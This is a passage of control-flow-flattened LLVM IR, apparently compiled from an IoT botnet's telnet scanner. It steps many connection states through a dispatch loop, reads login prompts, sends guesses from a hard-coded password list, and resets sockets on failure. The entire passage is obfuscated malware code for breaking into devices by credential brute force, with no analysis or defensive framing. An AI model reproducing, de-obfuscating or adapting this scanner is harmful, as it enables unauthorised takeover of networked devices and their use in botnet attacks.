  %.reload187 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload187, i64 %1139
  %1141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1140, i32 0, i32 5
  %1142 = load i8, i8* %1141, align 1
  %1143 = zext i8 %1142 to i64
  %1144 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1143
  %1145 = load i8*, i8** %1144, align 8
  %1146 = call i64 @strlen(i8* %1145) #10
  %1147 = call i64 @send(i32 %1129, i8* %1137, i64 %1146, i32 16384)
  %1148 = icmp slt i64 %1147, 0
  %1149 = select i1 %1148, i32 871230973, i32 -1492187283
  store i32 %1149, i32* %switchVar
  br label %loopEnd

; <label>:1150:                                   ; preds = %loopEntry
  %1151 = load i32, i32* %2, align 4
  %1152 = sext i32 %1151 to i64
  %.reload186 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload186, i64 %1152
  %1154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1153, i32 0, i32 0
  %1155 = load i32, i32* %1154, align 16
  %1156 = call i32 @sclose(i32 %1155)
  %1157 = load i32, i32* %2, align 4
  %1158 = sext i32 %1157 to i64
  %.reload185 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload185, i64 %1158
  %1160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1159, i32 0, i32 2
  store i8 0, i8* %1160, align 8
  %1161 = load i32, i32* %2, align 4
  %1162 = sext i32 %1161 to i64
  %.reload184 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload184, i64 %1162
  %1164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1163, i32 0, i32 3
  store i8 1, i8* %1164, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1165:                                   ; preds = %loopEntry
  %1166 = load i32, i32* %2, align 4
  %1167 = sext i32 %1166 to i64
  %.reload183 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload183, i64 %1167
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1168, i32 0, i32 0
  %1170 = load i32, i32* %1169, align 16
  %1171 = call i64 @send(i32 %1170, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %1172 = icmp slt i64 %1171, 0
  %1173 = select i1 %1172, i32 -412585016, i32 1412000025
  store i32 %1173, i32* %switchVar
  br label %loopEnd

; <label>:1174:                                   ; preds = %loopEntry
  %1175 = load i32, i32* %2, align 4
  %1176 = sext i32 %1175 to i64
  %.reload182 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload182, i64 %1176
  %1178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1177, i32 0, i32 0
  %1179 = load i32, i32* %1178, align 16
  %1180 = call i32 @sclose(i32 %1179)
  %1181 = load i32, i32* %2, align 4
  %1182 = sext i32 %1181 to i64
  %.reload181 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload181, i64 %1182
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1183, i32 0, i32 2
  store i8 0, i8* %1184, align 8
  %1185 = load i32, i32* %2, align 4
  %1186 = sext i32 %1185 to i64
  %.reload180 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload180, i64 %1186
  %1188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1187, i32 0, i32 3
  store i8 1, i8* %1188, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1189:                                   ; preds = %loopEntry
  %1190 = load i32, i32* %2, align 4
  %1191 = sext i32 %1190 to i64
  %.reload179 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload179, i64 %1191
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1192, i32 0, i32 2
  store i8 6, i8* %1193, align 8
  store i32 2003215975, i32* %switchVar
  br label %loopEnd

; <label>:1194:                                   ; preds = %loopEntry
  %1195 = load i32, i32* %2, align 4
  %1196 = sext i32 %1195 to i64
  %.reload178 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload178, i64 %1196
  %1198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1197, i32 0, i32 6
  %1199 = load i32, i32* %1198, align 4
  %1200 = icmp eq i32 %1199, 0
  %1201 = select i1 %1200, i32 -1033836807, i32 -1371548088
  store i32 %1201, i32* %switchVar
  br label %loopEnd

; <label>:1202:                                   ; preds = %loopEntry
  %1203 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1204 = load i32, i32* %2, align 4
  %1205 = sext i32 %1204 to i64
  %.reload177 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload177, i64 %1205
  %1207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1206, i32 0, i32 6
  store i32 %1203, i32* %1207, align 4
  store i32 -1371548088, i32* %switchVar
  br label %loopEnd

; <label>:1208:                                   ; preds = %loopEntry
  %1209 = load i32, i32* %2, align 4
  %1210 = sext i32 %1209 to i64
  %.reload176 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload176, i64 %1210
  %1212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1211, i32 0, i32 0
  %1213 = load i32, i32* %1212, align 16
  %1214 = load i32, i32* %2, align 4
  %1215 = sext i32 %1214 to i64
  %.reload175 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload175, i64 %1215
  %1217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1216, i32 0, i32 8
  %1218 = load i8*, i8** %1217, align 8
  %1219 = load i32, i32* %2, align 4
  %1220 = sext i32 %1219 to i64
  %.reload174 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload174, i64 %1220
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1221, i32 0, i32 7
  %1223 = load i16, i16* %1222, align 16
  %1224 = zext i16 %1223 to i32
  %1225 = call i32 @readUntil(i32 %1213, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1218, i32 1024, i32 %1224)
  %1226 = icmp ne i32 %1225, 0
  %1227 = select i1 %1226, i32 -34693171, i32 144683692
  store i32 %1227, i32* %switchVar
  br label %loopEnd

; <label>:1228:                                   ; preds = %loopEntry
  %1229 = load i32, i32* %2, align 4
  %1230 = sext i32 %1229 to i64
  %.reload173 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload173, i64 %1230
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1231, i32 0, i32 6
  store i32 0, i32* %1232, align 4
  %1233 = load i32, i32* %2, align 4
  %1234 = sext i32 %1233 to i64
  %.reload172 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload172, i64 %1234
  %1236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1235, i32 0, i32 7
  store i16 0, i16* %1236, align 16
  %1237 = load i32, i32* %2, align 4
  %1238 = sext i32 %1237 to i64
  %.reload171 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload171, i64 %1238
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1239, i32 0, i32 8
  %1241 = load i8*, i8** %1240, align 8
  %1242 = call i8* @strstr(i8* %1241, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %1243 = icmp ne i8* %1242, null
  %1244 = select i1 %1243, i32 545217725, i32 -1790163185
  store i32 %1244, i32* %switchVar
  br label %loopEnd

; <label>:1245:                                   ; preds = %loopEntry
  %1246 = load i32, i32* %2, align 4
  %1247 = sext i32 %1246 to i64
  %.reload170 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload170, i64 %1247
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1248, i32 0, i32 8
  %1250 = load i8*, i8** %1249, align 8
  call void @llvm.memset.p0i8.i64(i8* %1250, i8 0, i64 1024, i32 1, i1 false)
  %1251 = load i32, i32* %2, align 4
  %1252 = sext i32 %1251 to i64
  %.reload169 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload169, i64 %1252
  %1254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1253, i32 0, i32 0
  %1255 = load i32, i32* %1254, align 16
  %1256 = call i32 @sclose(i32 %1255)
  %1257 = load i32, i32* %2, align 4
  %1258 = sext i32 %1257 to i64
  %.reload168 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload168, i64 %1258
  %1260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1259, i32 0, i32 2
  store i8 0, i8* %1260, align 8
  %1261 = load i32, i32* %2, align 4
  %1262 = sext i32 %1261 to i64
  %.reload167 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload167, i64 %1262
  %1264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1263, i32 0, i32 3
  store i8 0, i8* %1264, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1265:                                   ; preds = %loopEntry
  %1266 = load i32, i32* %2, align 4
  %1267 = sext i32 %1266 to i64
  %.reload166 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload166, i64 %1267
  %1269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1268, i32 0, i32 8
  %1270 = load i8*, i8** %1269, align 8
  %1271 = call i32 @matchPrompt(i8* %1270)
  %1272 = icmp ne i32 %1271, 0
  %1273 = select i1 %1272, i32 -1025593086, i32 -508676392
  store i32 %1273, i32* %switchVar
  br label %loopEnd

; <label>:1274:                                   ; preds = %loopEntry
  %1275 = load i32, i32* %2, align 4
  %1276 = sext i32 %1275 to i64
  %.reload165 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload165, i64 %1276
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1277, i32 0, i32 8
  %1279 = load i8*, i8** %1278, align 8
  call void @llvm.memset.p0i8.i64(i8* %1279, i8 0, i64 1024, i32 1, i1 false)
  %1280 = load i32, i32* %2, align 4
  %1281 = sext i32 %1280 to i64
  %.reload164 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload164, i64 %1281
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1282, i32 0, i32 0
  %1284 = load i32, i32* %1283, align 16
  %1285 = call i32 @sclose(i32 %1284)
  %1286 = load i32, i32* %2, align 4
  %1287 = sext i32 %1286 to i64
  %.reload163 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload163, i64 %1287
  %1289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1288, i32 0, i32 2
  store i8 0, i8* %1289, align 8
  %1290 = load i32, i32* %2, align 4
  %1291 = sext i32 %1290 to i64
  %.reload162 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload162, i64 %1291
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1292, i32 0, i32 3
  store i8 1, i8* %1293, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1294:                                   ; preds = %loopEntry
  %1295 = load i32, i32* %2, align 4
  %1296 = sext i32 %1295 to i64
  %.reload161 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload161, i64 %1296
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1297, i32 0, i32 2
  store i8 7, i8* %1298, align 8
  store i32 -973648741, i32* %switchVar
  br label %loopEnd

; <label>:1299:                                   ; preds = %loopEntry
  %1300 = load i32, i32* %2, align 4
  %1301 = sext i32 %1300 to i64
  %.reload160 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload160, i64 %1301
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1302, i32 0, i32 8
  %1304 = load i8*, i8** %1303, align 8
  call void @llvm.memset.p0i8.i64(i8* %1304, i8 0, i64 1024, i32 1, i1 false)
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1305:                                   ; preds = %loopEntry
  %1306 = load i32, i32* %2, align 4
  %1307 = sext i32 %1306 to i64
  %.reload159 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload159, i64 %1307
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1308, i32 0, i32 0
  %1310 = load i32, i32* %1309, align 16
  %1311 = load i32, i32* %2, align 4
  %1312 = sext i32 %1311 to i64
  %.reload158 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload158, i64 %1312
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1313, i32 0, i32 8
  %1315 = load i8*, i8** %1314, align 8
  %1316 = load i32, i32* %2, align 4
  %1317 = sext i32 %1316 to i64
  %.reload157 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload157, i64 %1317
  %1319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1318, i32 0, i32 7
  %1320 = load i16, i16* %1319, align 16
  %1321 = zext i16 %1320 to i32
  %1322 = call i32 @readUntil(i32 %1310, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1315, i32 1024, i32 %1321)
  %1323 = icmp ne i32 %1322, 0
  %1324 = select i1 %1323, i32 -126441515, i32 -824814330
  store i32 %1324, i32* %switchVar
  br label %loopEnd

; <label>:1325:                                   ; preds = %loopEntry
  %1326 = load i32, i32* %2, align 4
  %1327 = sext i32 %1326 to i64
  %.reload156 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload156, i64 %1327
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1328, i32 0, i32 6
  store i32 0, i32* %1329, align 4
  %1330 = load i32, i32* %2, align 4
  %1331 = sext i32 %1330 to i64
  %.reload155 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload155, i64 %1331
  %1333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1332, i32 0, i32 7
  store i16 0, i16* %1333, align 16
  %1334 = load i32, i32* %2, align 4
  %1335 = sext i32 %1334 to i64
  %.reload154 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload154, i64 %1335
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1336, i32 0, i32 8
  %1338 = load i8*, i8** %1337, align 8
  %1339 = call i8* @strstr(i8* %1338, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %1340 = icmp ne i8* %1339, null
  %1341 = select i1 %1340, i32 -581980833, i32 -1926930930
  store i32 %1341, i32* %switchVar
  br label %loopEnd

; <label>:1342:                                   ; preds = %loopEntry
  %1343 = load i32, i32* %2, align 4
  %1344 = sext i32 %1343 to i64
  %.reload153 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload153, i64 %1344
  %1346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1345, i32 0, i32 8
  %1347 = load i8*, i8** %1346, align 8
  call void @llvm.memset.p0i8.i64(i8* %1347, i8 0, i64 1024, i32 1, i1 false)
  %1348 = load i32, i32* %2, align 4
  %1349 = sext i32 %1348 to i64
  %.reload152 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload152, i64 %1349
  %1351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1350, i32 0, i32 0
  %1352 = load i32, i32* %1351, align 16
  %1353 = call i32 @sclose(i32 %1352)
  %1354 = load i32, i32* %2, align 4
  %1355 = sext i32 %1354 to i64
  %.reload151 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload151, i64 %1355
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1356, i32 0, i32 2
  store i8 0, i8* %1357, align 8
  %1358 = load i32, i32* %2, align 4
  %1359 = sext i32 %1358 to i64
  %.reload150 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload150, i64 %1359
  %1361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1360, i32 0, i32 3
  store i8 0, i8* %1361, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1362:                                   ; preds = %loopEntry
  %1363 = load i32, i32* %2, align 4
  %1364 = sext i32 %1363 to i64
  %.reload149 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload149, i64 %1364
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1365, i32 0, i32 8
  %1367 = load i8*, i8** %1366, align 8
  %1368 = call i32 @matchPrompt(i8* %1367)
  %1369 = icmp ne i32 %1368, 0
  %1370 = select i1 %1369, i32 -470197491, i32 -1637696474
  store i32 %1370, i32* %switchVar
  br label %loopEnd

; <label>:1371:                                   ; preds = %loopEntry
  %1372 = load i32, i32* %2, align 4
  %1373 = sext i32 %1372 to i64
  %.reload148 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload148, i64 %1373
  %1375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1374, i32 0, i32 8
  %1376 = load i8*, i8** %1375, align 8
  call void @llvm.memset.p0i8.i64(i8* %1376, i8 0, i64 1024, i32 1, i1 false)
  %1377 = load i32, i32* %2, align 4
  %1378 = sext i32 %1377 to i64
  %.reload147 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload147, i64 %1378
  %1380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1379, i32 0, i32 0
  %1381 = load i32, i32* %1380, align 16
  %1382 = call i32 @sclose(i32 %1381)
  %1383 = load i32, i32* %2, align 4
  %1384 = sext i32 %1383 to i64
  %.reload146 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload146, i64 %1384
  %1386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1385, i32 0, i32 2
  store i8 0, i8* %1386, align 8
  %1387 = load i32, i32* %2, align 4
  %1388 = sext i32 %1387 to i64
  %.reload145 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload145, i64 %1388
  %1390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1389, i32 0, i32 3
  store i8 1, i8* %1390, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1391:                                   ; preds = %loopEntry
  %1392 = load i32, i32* %2, align 4
  %1393 = sext i32 %1392 to i64
  %.reload144 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload144, i64 %1393
  %1395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1394, i32 0, i32 2
  store i8 7, i8* %1395, align 8
  store i32 311726222, i32* %switchVar
  br label %loopEnd

; <label>:1396:                                   ; preds = %loopEntry
  %1397 = load i32, i32* %2, align 4
  %1398 = sext i32 %1397 to i64
  %.reload143 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload143, i64 %1398
  %1400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1399, i32 0, i32 8
  %1401 = load i8*, i8** %1400, align 8
  call void @llvm.memset.p0i8.i64(i8* %1401, i8 0, i64 1024, i32 1, i1 false)
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1402:                                   ; preds = %loopEntry
  %1403 = load i32, i32* %2, align 4
  %1404 = sext i32 %1403 to i64
  %.reload142 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload142, i64 %1404
  %1406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1405, i32 0, i32 0
  %1407 = load i32, i32* %1406, align 16
  %1408 = load i32, i32* %2, align 4
  %1409 = sext i32 %1408 to i64
  %.reload141 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload141, i64 %1409
  %1411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1410, i32 0, i32 8
  %1412 = load i8*, i8** %1411, align 8
  %1413 = load i32, i32* %2, align 4
  %1414 = sext i32 %1413 to i64
  %.reload140 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload140, i64 %1414
  %1416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1415, i32 0, i32 7
  %1417 = load i16, i16* %1416, align 16
  %1418 = zext i16 %1417 to i32
  %1419 = call i32 @readUntil(i32 %1407, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1412, i32 1024, i32 %1418)
  %1420 = icmp ne i32 %1419, 0
  %1421 = select i1 %1420, i32 2118473482, i32 1170152450
  store i32 %1421, i32* %switchVar
  br label %loopEnd

; <label>:1422:                                   ; preds = %loopEntry
  %1423 = load i32, i32* %2, align 4
  %1424 = sext i32 %1423 to i64
  %.reload139 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload139, i64 %1424
  %1426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1425, i32 0, i32 6
  store i32 0, i32* %1426, align 4
  %1427 = load i32, i32* %2, align 4
  %1428 = sext i32 %1427 to i64
  %.reload138 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload138, i64 %1428
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1429, i32 0, i32 7
  store i16 0, i16* %1430, align 16
  %1431 = load i32, i32* %2, align 4
  %1432 = sext i32 %1431 to i64
  %.reload137 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload137, i64 %1432
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1433, i32 0, i32 8
  %1435 = load i8*, i8** %1434, align 8
  %1436 = call i8* @strstr(i8* %1435, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %1437 = icmp ne i8* %1436, null
  %1438 = select i1 %1437, i32 418973031, i32 1136667762
  store i32 %1438, i32* %switchVar
  br label %loopEnd

; <label>:1439:                                   ; preds = %loopEntry
  %1440 = load i32, i32* %2, align 4
  %1441 = sext i32 %1440 to i64
  %.reload136 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload136, i64 %1441
  %1443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1442, i32 0, i32 8
  %1444 = load i8*, i8** %1443, align 8
  call void @llvm.memset.p0i8.i64(i8* %1444, i8 0, i64 1024, i32 1, i1 false)
  %1445 = load i32, i32* %2, align 4
  %1446 = sext i32 %1445 to i64
  %.reload135 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload135, i64 %1446
  %1448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1447, i32 0, i32 0
  %1449 = load i32, i32* %1448, align 16
  %1450 = call i32 @sclose(i32 %1449)
  %1451 = load i32, i32* %2, align 4
  %1452 = sext i32 %1451 to i64
  %.reload134 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload134, i64 %1452
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1453, i32 0, i32 2
  store i8 0, i8* %1454, align 8
  %1455 = load i32, i32* %2, align 4
  %1456 = sext i32 %1455 to i64
  %.reload133 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload133, i64 %1456
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1457, i32 0, i32 3
  store i8 0, i8* %1458, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1459:                                   ; preds = %loopEntry
  %1460 = load i32, i32* %2, align 4
  %1461 = sext i32 %1460 to i64
  %.reload132 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload132, i64 %1461
  %1463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1462, i32 0, i32 8
  %1464 = load i8*, i8** %1463, align 8
  %1465 = call i32 @matchPrompt(i8* %1464)
  %1466 = icmp ne i32 %1465, 0
  %1467 = select i1 %1466, i32 266275480, i32 -1530896896
  store i32 %1467, i32* %switchVar
  br label %loopEnd

; <label>:1468:                                   ; preds = %loopEntry
  %1469 = load i32, i32* %2, align 4
  %1470 = sext i32 %1469 to i64
  %.reload131 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload131, i64 %1470
  %1472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1471, i32 0, i32 8
  %1473 = load i8*, i8** %1472, align 8
  call void @llvm.memset.p0i8.i64(i8* %1473, i8 0, i64 1024, i32 1, i1 false)
  %1474 = load i32, i32* %2, align 4
  %1475 = sext i32 %1474 to i64
  %.reload130 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload130, i64 %1475
  %1477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1476, i32 0, i32 0
  %1478 = load i32, i32* %1477, align 16
  %1479 = call i32 @sclose(i32 %1478)
  %1480 = load i32, i32* %2, align 4
  %1481 = sext i32 %1480 to i64
  %.reload129 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload129, i64 %1481
